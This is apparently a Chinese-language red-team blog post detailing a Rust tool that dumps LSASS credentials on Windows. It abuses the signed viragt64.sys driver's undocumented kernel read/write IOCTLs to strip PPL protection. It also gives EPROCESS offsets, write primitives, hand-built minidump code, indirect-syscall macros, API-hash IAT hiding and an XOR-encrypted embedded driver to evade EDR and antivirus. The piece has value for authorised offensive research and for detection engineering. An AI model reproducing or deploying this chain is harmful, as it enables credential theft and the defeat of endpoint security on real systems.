# 从零到一：用 Rust 编写 BYOVD LSASS Dumper 的完整技术剖析

> 本文记录了一次完整的攻防研究过程：从理解 LSASS 凭据提取原理，到逆向分析一个"冷门"驱动发现未公开的内核读写 IOCTL，再到用 Rust 实现一个无 API 导入、无 `MiniDumpWriteDump` 调用、完全绕过 PPL 保护的 LSASS 凭据转储工具。

---

## 0x01 背景：为什么 LSASS 越来越难 Dump

LSASS (Local Security Authority Subsystem Service) 是 Windows 凭据体系的核心进程，内存中存储着用户的明文密码、NTLM Hash、Kerberos Ticket 等敏感数据。从 mimikatz 诞生至今，攻防双方围绕 LSASS 的对抗不断升级：

| 防御层 | 机制 | 绕过难度 |
|--------|------|---------|
| **用户态 Hook** | EDR Hook `MiniDumpWriteDump`、`OpenProcess`、`ReadProcessMemory` | ⭐⭐ |
| **PPL 保护** | `EPROCESS.Protection` 字段阻止非特权进程打开 LSASS | ⭐⭐⭐ |
| **Credential Guard** | 凭据隔离到 VSM (Virtual Secure Mode) | ⭐⭐⭐⭐⭐ |
| **WDAC 驱动黑名单** | 阻止已知漏洞驱动加载 | ⭐⭐⭐ |
| **Sysmon 监控** | Event 10 记录 LSASS 句柄访问 | ⭐⭐ |

我们的目标是在 **PPL 开启、EDR 存在** 的环境下完成 LSASS dump。最终选择的技术方案：

```
BYOVD (内核读写) → 清零 PPL → 直接 OpenProcess → 手工构建 Minidump
```

---

## 0x02 技术选型：为什么用 Rust

传统的 LSASS dumper 多用 C/C++ 编写（如 nanodump、PPLKiller）。我们选择 Rust 有以下考量：

1. **零成本抽象** — `repr(C)` 精确控制内存布局，与 C 同级别的底层控制力
2. **安全的 unsafe** — unsafe block 隔离危险操作，减少内核交互代码中的低级 bug
3. **编译体积** — `opt-level=z` + LTO + strip 可以压缩到 ~90KB
4. **无运行时** — `panic=abort` 无需 unwind 表，二进制更干净
5. **windows-rs** — 微软官方 crate，提供完整的 Win32/NT API 绑定

```toml
[profile.release]
opt-level = "z"       # 体积优先
lto = true            # 链接时优化
codegen-units = 1     # 最大优化
panic = "abort"       # 无 unwind
strip = true          # 移除符号
```

---

## 0x03 动态 API 解析：隐藏 IAT 特征

### 问题

如果直接 `use windows::Win32::...` 调用 API，编译后的 PE 导入表 (IAT) 会包含 `OpenProcess`、`NtQuerySystemInformation` 等敏感函数名，任何静态分析工具一扫便知。

### 方案：PEB Walk + DJB2 Hash

我们在运行时通过遍历 PEB (Process Environment Block) 中的模块链表来定位 DLL 基址，再解析 PE Export Address Table 获取函数指针。所有函数名用 DJB2 hash 值代替，二进制中不存在任何明文 API 名称。

```
Thread Environment Block (gs:[0x60])
  └── PEB
       └── PEB_LDR_DATA
            └── InMemoryOrderModuleList (双向链表)
                 ├── ntdll.dll     (hash: 0x8B1E6A50)
                 ├── kernel32.dll  (hash: 0xB4ED2B2A)
                 └── advapi32.dll  (hash: 0xCE15BA62)
```

对每个模块：

```rust
// DJB2 哈希算法
fn djb2_hash(name: &[u8]) -> u32 {
    let mut hash: u32 = 5381;
    for &c in name {
        hash = hash.wrapping_mul(33).wrapping_add(c as u32);
    }
    hash
}
```

最终的 API 调用完全通过函数指针：

```rust
// 动态解析 CreateFileW
let fn_create: FnCreateFileW = transmute(
    api.k32(HASH_CREATE_FILE_W).ok_or("resolve failed")?
);
// 调用 — 二进制中不出现 "CreateFileW" 字符串
let handle = fn_create(path.as_ptr(), ...);
```

---

## 0x04 BYOVD：逆向 viragt64.sys 发现未公开的内核读写

### 什么是 BYOVD

Bring Your Own Vulnerable Driver — 利用合法签名但存在漏洞的驱动来获取内核能力。Windows 默认信任有合法 Authenticode 签名的驱动，即使该驱动存在安全漏洞。

### 为什么选 viragt64.sys

最初使用的是 RTCore64.sys（微星 Afterburner 驱动，CVE-2019-16098），但它太"出名"了——几乎所有 EDR 都有其签名。viragt64.sys 来自 TG Soft 的 VirIT 杀毒软件，公开文档只记录了一个"杀进程"的 IOCTL `0x82730030`。

**关键问题：杀进程不等于内核读写。PPL bypass 需要读写 EPROCESS 结构。**

### IDA 逆向分析过程

加载 viragt64.sys 到 IDA Pro，定位 `DriverEntry`：

```
DriverEntry (0x25008)
  └── sub_1A4A8  (真正的初始化函数)
       ├── IoCreateDevice("\\Device\\viragtlt", 0x845A)
       ├── IoCreateSymbolicLink("\\DosDevices\\vira...")
       └── memset64(DriverObject->MajorFunction, sub_14130, 0x1C)
                                                    │
                                                    ▼
                                              sub_14130  (IRP 分发入口)
                                                    │
                                              if (DeviceObject == target)
                                                    │
                                                    ▼
                                              sub_13624  ★ 主 IOCTL dispatch ★
```

`sub_13624` 是一个巨大的 switch-case 分发函数，处理 `IRP_MJ_DEVICE_CONTROL` (MajorFunction[14])。反编译后发现 **~30 个 IOCTL handler**，远超公开记录的 1 个。

### 关键发现 1：任意内核读（IOCTL 0x82730028）

```c
// 反编译伪代码
case 0x82730028:
    source_addr = *(PVOID *)SystemBuffer;          // +0x00
    length = *(ULONG *)(SystemBuffer + 0x18);      // +0x18
    
    temp_buf = ExAllocatePoolWithTag(NonPagedPool, length, 'vigv');
    sub_1311C(source_addr, temp_buf, length);       // MDL-based copy
    memmove(SystemBuffer, temp_buf, length);        // Copy to output
    ExFreePoolWithTag(temp_buf);
```

深入 `sub_1311C`，发现它使用 MDL (Memory Descriptor List) 进行安全的内核内存拷贝：

```c
__int64 sub_1311C(PVOID source, PVOID dest, ULONG length) {
    if (!MmIsNonPagedSystemAddressValid(source))
        return STATUS_ACCESS_VIOLATION;
    
    // 为源地址创建 MDL 并映射
    src_mdl = IoAllocateMdl(source, length, ...);
    MmBuildMdlForNonPagedPool(src_mdl);
    src_va = MmMapLockedPagesSpecifyCache(src_mdl, KernelMode, ...);
    
    // 为目标创建 MDL 并锁定
    dst_mdl = IoAllocateMdl(dest, length, ...);
    MmProbeAndLockPages(dst_mdl, KernelMode, IoWriteAccess);
    dst_va = MmMapLockedPagesSpecifyCache(dst_mdl, ...);
    
    // 逐字节拷贝，每字节都验证地址有效性
    for (i = 0; i < length; i++) {
        if (MmIsAddressValid(src_va))
            *dst_va = *src_va;
        src_va++; dst_va++;
    }
}
```

这比 RTCore64 的读取更安全——RTCore64 不做任何地址验证，读到无效地址直接 BSOD。

### 关键发现 2：任意内核写（IOCTL 0x8273007C）

从汇编确认了精确布局：

```asm
; IOCTL 0x8273007C handler
13e79:  mov     rbp, [rdi]        ; dest = SystemBuffer[0x00]
        ...
        call    sub_1C128         ; 获取 IRQL 保存
13e9a:  mov     rcx, [rdi+8]      ; val1 = SystemBuffer[0x08]
13e9e:  xchg    rcx, [rbp+0]      ; InterlockedExchange64(*dest, val1)
13ea2:  mov     rdx, [rdi+10h]    ; val2 = SystemBuffer[0x10]
13ea6:  xchg    rdx, [rbp+8]      ; InterlockedExchange64(*(dest+8), val2)
```

在 DISPATCH_LEVEL 下使用 `xchg`（隐含 `lock` 前缀）进行原子写入。每次写 2 个 QWORD (16 字节)。

### Buffer 布局汇总

| IOCTL | 功能 | 输入 Buffer |
|-------|------|------------|
| `0x82730028` | 内核读 | `[addr:u64 @0x00, len:u32 @0x18]` |
| `0x8273007C` | 内核写 (2 QWORD) | `[dest:u64 @0x00, val1:u64 @0x08, val2:u64 @0x10]` |
| `0x82730030` | 杀进程 (已知) | `[process_name:char[256] @0x00]` |

---

## 0x05 PPL Bypass：从内核空间清零保护字段

### PPL 原理

Windows 通过 `EPROCESS.Protection` 字段（1 字节）控制进程保护级别：

```
Protection = 0x61
  ├── Type  (低 3 位): 1 = PsProtectedTypeProtectedLight
  └── Signer (高 4 位): 6 = PsProtectedSignerLsa
```

当此字段非零时，`PsOpenProcess` 在内核中会拒绝来自非特权进程的 `PROCESS_VM_READ` 请求。

### Bypass 步骤

```
┌─ 步骤 1: 获取 ntoskrnl 内核基址 ──────────────────────────┐
│  NtQuerySystemInformation(SystemModuleInformation)        │
│  → 遍历模块列表，第一个 = ntoskrnl.exe                      │
│  → 基址: 0xFFFFF80133200000                               │
└───────────────────────────────────────────────────────────┘
         │
         ▼
┌─ 步骤 2: 定位 PsInitialSystemProcess ─────────────────────┐
│  在用户态加载 ntoskrnl.exe (DONT_RESOLVE_DLL_REFERENCES)    │
│  → 解析 PE EAT → 找到 PsInitialSystemProcess 的 RVA       │
│  → 内核地址 = 内核基址 + RVA                                │
│  → 读取该指针 → System 进程的 EPROCESS (PID 4)              │
└───────────────────────────────────────────────────────────┘
         │
         ▼
┌─ 步骤 3: 遍历 EPROCESS 链表 ──────────────────────────────┐
│  EPROCESS.ActiveProcessLinks 是双向链表                     │
│  Flink → 下一个 EPROCESS                                   │
│  读取 UniqueProcessId，比对 LSASS PID                       │
│  → 找到 LSASS EPROCESS: 0xFFFFB484F519A080                │
└───────────────────────────────────────────────────────────┘
         │
         ▼
┌─ 步骤 4: 清零 Protection ────────────────────────────────┐
│  // EPROCESS offsets for Win10 22H2 (build 19045)         │
│  read_u8(eprocess + 0x87A)  → 0x61 (原始保护值)            │
│  write_u8(eprocess + 0x87A, 0x00)  → PPL 已关闭！          │
│                                                           │
│  // dump 完成后恢复                                        │
│  write_u8(eprocess + 0x87A, 0x61)  → 保护已恢复             │
└───────────────────────────────────────────────────────────┘
```

### 关于 write_u8 的实现细节

viragt64.sys 的写 IOCTL 最小粒度是 QWORD (8 字节)，但 Protection 只有 1 字节。我们使用 **read-modify-write** 模式：

```rust
pub fn write_u8(&self, address: u64, value: u8) -> Result<(), String> {
    // 1. 对齐到 QWORD 边界
    let qword_addr = address & !7u64;
    let byte_offset = (address - qword_addr) as usize;

    // 2. 读出包含目标字节的 16 字节 (2 个 QWORD)
    let mut buf = [0u8; 16];
    self.raw_read(qword_addr, &mut buf)?;

    // 3. 修改目标字节
    buf[byte_offset] = value;

    // 4. 将整个 2 QWORD 写回
    let val1 = u64::from_le_bytes(buf[0..8].try_into().unwrap());
    let val2 = u64::from_le_bytes(buf[8..16].try_into().unwrap());
    self.raw_write_2qword(qword_addr, val1, val2)
}
```

### EPROCESS 偏移量

不同 Windows 版本的 EPROCESS 结构有不同偏移。通过读取 `KUSER_SHARED_DATA` (用户态固定映射在 `0x7FFE0000`) 的 Build Number 来选择正确的偏移表：

```rust
// offsets.rs - 部分示例
match build_number {
    19045 => Offsets {    // Win10 22H2
        unique_process_id:    0x440,
        active_process_links: 0x448,
        image_file_name:      0x5A8,
        protection:           0x87A,
        token:                0x4B8,
    },
    22631 => Offsets {    // Win11 23H2
        unique_process_id:    0x440,
        active_process_links: 0x448,
        image_file_name:      0x5A8,
        protection:           0x87A,
        token:                0x4B8,
    },
    ...
}
```

---

## 0x06 手工 Minidump：绕过 MiniDumpWriteDump

### 为什么不用 MiniDumpWriteDump

`MiniDumpWriteDump` 是 `dbghelp.dll` 导出的标准 API，是 mimikatz 等工具的核心调用。**所有主流 EDR 都 hook 了这个函数**，调用它 = 秒被检测。

### MDMP 文件格式

MDMP (MiniDuMP) 是微软定义的进程转储格式，结构清晰：

```
Offset   Structure
──────   ─────────────────────────────────
0x0000   MINIDUMP_HEADER {
           Signature: "MDMP"  (4 bytes)
           Version:   0xA793  (4 bytes, 低 16 位)
           NumberOfStreams: 3  (4 bytes)
           StreamDirectoryRva: 0x20  (4 bytes)
           ...
         }                    Total: 32 bytes

0x0020   MINIDUMP_DIRECTORY[3] {
           [0] { StreamType: SystemInfoStream,  Location }
           [1] { StreamType: ModuleListStream,  Location }
           [2] { StreamType: Memory64ListStream, Location }
         }                    Total: 36 bytes

0x0044   SystemInfoStream      (OS 版本, CPU 架构)
0x????   ModuleListStream      (模块数 + 模块数组 + 名称字符串)
0x????   Memory64ListStream    (区域数 + BaseRva + 描述符数组)
0x????   Raw Memory Data       (所有区域的内存内容连续排列)
```

### 内存收集过程

```rust
// 枚举 LSASS 所有内存区域
loop {
    let status = VirtualQueryEx(process, addr, &mut mbi, ...);
    if status == 0 { break; }
    
    // 只 dump 已提交且可读的页面
    if mbi.State == MEM_COMMIT 
       && !(mbi.Protect & PAGE_GUARD) 
       && matches!(mbi.Protect, 
            PAGE_READONLY | PAGE_READWRITE | PAGE_EXECUTE_READ | ...)
    {
        let mut buf = vec![0u8; mbi.RegionSize];
        ReadProcessMemory(process, addr, buf.as_mut_ptr(), ...);
        regions.push(MemoryRegion { base: addr, data: buf });
    }
    addr += mbi.RegionSize;
}
```

最终生成的 `.dmp` 文件与 `MiniDumpWriteDump` 生成的格式完全兼容：

```bash
pypykatz lsa minidump lsass.dmp
# 正常输出凭据信息
```

---

## 0x07 间接系统调用：绕过用户态 Hook

### Hook 原理

EDR 通过 inline hook 修改 `ntdll.dll` 中系统调用函数的入口：

```
原始:                          被 Hook 后:
ntdll!NtOpenProcess:           ntdll!NtOpenProcess:
  mov r10, rcx                   jmp EDR_hook_handler  ← 跳转到 EDR
  mov eax, 0x26                  ...
  syscall                        
  ret                            
```

### Hell's Gate + Halo's Gate

**Hell's Gate**: 直接从 ntdll 导出表定位 Zw* 函数，读取函数序言中的 System Service Number (SSN)：

```
4C 8B D1        mov r10, rcx
B8 26 00 00 00  mov eax, 0x26     ← SSN = 0x26 (NtOpenProcess)
```

**Halo's Gate**: 如果目标函数被 hook（开头是 `jmp`/`0xE9`），则上下搜索相邻的未被 hook 的函数，通过 SSN +/- 偏移计算出目标 SSN。

```rust
// 从 ntdll 中找 SSN
fn resolve_ssn(func_addr: *const u8) -> Option<u16> {
    unsafe {
        let bytes = std::slice::from_raw_parts(func_addr, 24);
        // 未 hook: 4C 8B D1 B8 XX XX 00 00
        if bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[3] == 0xB8 {
            return Some(u16::from_le_bytes([bytes[4], bytes[5]]));
        }
        // 被 hook: 向上/向下搜索相邻函数的 SSN
        for delta in 1..=20 {
            // Halo's Gate: neighbor SSN ± delta
            ...
        }
        None
    }
}
```

通过 `syscall` 指令直接进入内核，完全绕过 ntdll 中的 EDR hook。

---

## 0x08 踩坑记录

### Bug 1（致命）：RtCoreRequest 结构体大小和字段顺序错误

初始版本使用 RTCore64.sys 时，将请求结构定义为 32 字节，但驱动期望 48 字节。同时 `value` 和 `value_size` 字段顺序反了：

```diff
 #[repr(C)]
 struct RtCoreRequest {
     pad0: u64,
     address: u64,
     pad1: u64,
-    value: u32,      // 驱动期望这里是 size
-    size: u32,       // 驱动期望这里是 value
+    value_size: u32, // +0x18: 读写大小 (1 or 4)
+    value: u32,      // +0x1C: 读到的值/要写的值
+    pad2: [u8; 16],  // 补齐到 48 字节
 }
```

**后果**：驱动将 size（值可能很大）当作要写入的值，将 value（通常很小）当作大小。内核内存被随机数据覆盖 → **BSOD**。

**教训**：与内核驱动通信时，结构体的每个字节都必须与驱动期望的布局严格对齐。差一个字段就是蓝屏。

### Bug 2：OpenProcess 返回 ACCESS_DENIED

PPL 已经成功清零，但 `OpenProcess(PROCESS_ALL_ACCESS)` 仍然被拒绝。

**原因**：`SeDebugPrivilege` 需要显式启用。管理员进程默认**拥有**此权限但处于**禁用**状态。

```rust
fn enable_se_debug_privilege() -> bool {
    LookupPrivilegeValueW(None, "SeDebugPrivilege", &mut luid);
    AdjustTokenPrivileges(token, false, &tp, ...);
}
```

### Bug 3：驱动加载失败 (Error 1058)

第二次运行时 `StartServiceW` 返回 1058 (`ERROR_SERVICE_DISABLED`)。

**原因**：viragt64.sys 卸载会 BSOD，所以第一次运行用 `std::mem::forget()` 跳过了清理，导致服务残留。修复：允许 1058 通过，复用已加载的驱动。

---

## 0x09 检测面分析与对抗

| 攻击指标 | 检测方式 | 本工具的规避手段 |
|---------|---------|----------------|
| PE 导入表含敏感 API | 静态分析 | ✅ PEB walk + DJB2 hash，IAT 完全干净 |
| 调用 `MiniDumpWriteDump` | API hook / 行为检测 | ✅ 手工构建 MDMP，不调用该 API |
| 加载已知漏洞驱动 | 文件 hash / 签名匹配 | ⚠️ viragt64 已被部分 AV 标记 |
| `OpenProcess` LSASS | Sysmon Event 10 | ⚠️ 可用 fork/dup 方法降低特征 |
| 写入 EPROCESS.Protection | 内核回调 / ETW | ⚠️ 无直接规避（需要内核级反检测） |
| dump 文件落盘 | 内容扫描 | ✅ 可选 XOR 加密 |

---

## 0x0A 驱动嵌入加密：无文件落盘

### 问题

Kaspersky 等 AV 会在文件扫描阶段直接标记 viragt64.sys 为 `HEUR:Exploit.Win64.VulDriver.h`。只要驱动文件以明文存在于磁盘上，就会被实时扫描拦截。

### 方案：XOR 加密嵌入 + 运行时解密

```
编译前                          运行时
┌──────────┐                  ┌──────────────────────────────────┐
│ .sys 明文 │ ── encrypt ──→  │ include_bytes!("driver.enc")     │
└──────────┘    (XOR)         │ → XOR 解密到内存                   │
                              │ → 写入 %TEMP%\drv_<rand>.sys      │
                              │ → CreateServiceW + StartServiceW │
                              │ → 删除临时文件                     │
                              └──────────────────────────────────┘
```

32 字节 XOR key 在编译时硬编码。加密工具 (`tools/encrypt_driver.py`) 生成 `.enc` 文件，通过 `include_bytes!` 在编译时嵌入：

```rust
const DRIVER_ENC: &[u8] = include_bytes!("../viragt64.sys.enc");

fn resolve_driver_path() -> (String, Option<PathBuf>) {
    let mut decrypted = DRIVER_ENC.to_vec();
    for (i, byte) in decrypted.iter_mut().enumerate() {
        *byte ^= DRIVER_XOR_KEY[i % DRIVER_XOR_KEY.len()];
    }
    // RDTSC 随机文件名，写入 %TEMP%，加载后删除
    let temp = temp_dir().join(format!("drv_{:08x}.sys", rdtsc()));
    std::fs::write(&temp, &decrypted)?;
    (temp.to_string_lossy().to_string(), Some(temp))
}
```

**效果**：磁盘上永远不存在 `.sys` 明文。文件名随机化，不包含 `viragt64` 关键字。

---

## 0x0B Direct Syscall：NtReadVirtualMemory 替代 ReadProcessMemory

### 问题

即使绕过了 PPL，内存读取阶段仍使用 `ReadProcessMemory` — 从 `kernel32.dll` → `ntdll!NtReadVirtualMemory` 的调用链上，EDR 可以在两层都设置 hook。

### 方案：5 参数间接系统调用

`NtReadVirtualMemory` 有 5 个参数。前 4 个走寄存器 (rcx/rdx/r8/r9)，第 5 个必须放在栈上 `[rsp+0x28]`。新增 `indirect_syscall5!` 宏：

```rust
macro_rules! indirect_syscall5 {
    ($entry:expr, $a1:expr, $a2:expr, $a3:expr, $a4:expr, $a5:expr) => {{
        std::arch::asm!(
            "sub rsp, 0x38",            // shadow space + 5th arg
            "mov [rsp+0x28], {a5}",     // 第 5 个参数放栈上
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            "jmp {addr}",              // → ntdll 的 syscall;ret gadget
            ...
        );
    }};
}
```

调用示例：

```rust
let nrvm = resolve_ssn(api, HASH_NT_READ_VIRTUAL_MEMORY)?;
let status = indirect_syscall5!(
    nrvm,
    process.0, mbi.BaseAddress, buffer.as_mut_ptr(),
    region_size, &mut bytes_read as *mut _
);
```

**效果**：完全绕过 `kernel32.dll` 和 `ntdll.dll` 的 hook。二进制不存在 `ReadProcessMemory` 导入。

---

## 0x0C 检测面分析与对抗

| 攻击指标 | 检测方式 | 规避手段 |
|---------|---------|---------|
| PE 导入表含敏感 API | 静态分析 | ✅ PEB walk + DJB2 hash |
| `MiniDumpWriteDump` | API hook | ✅ 手工构建 MDMP |
| `ReadProcessMemory` | API hook | ✅ NtReadVirtualMemory 间接系统调用 |
| 已知漏洞驱动文件 | 文件 hash 匹配 | ✅ 驱动 XOR 加密嵌入 + 随机文件名 |
| `OpenProcess` LSASS | Sysmon Event 10 | ⚠️ 可用 fork/dup 方法 |
| 写入 EPROCESS.Protection | 内核回调 / ETW | ⚠️ 需内核级反检测 |
| dump 文件落盘 | 内容扫描 | ✅ 可选 XOR 加密 |

---

## 0x0D 总结

本项目完整实现了一个现代化的 LSASS 凭据转储工具：

1. **BYOVD 利用链** — 从驱动逆向到 IOCTL exploit
2. **内核数据结构操作** — EPROCESS 链表遍历与字段修改
3. **文件格式逆向** — 手工实现 MDMP 文件格式
4. **EDR 绕过** — IAT 隐藏、间接系统调用、避免 hooked API
5. **驱动嵌入加密** — XOR 加密 + 运行时解密 + 随机文件名
6. **全链路 Syscall** — 进程内存读取全部通过间接系统调用

---

*本文仅用于授权安全研究和红队评估。未经授权的使用是违法的。工具和技术的公开旨在推动攻防双方的共同进步。*

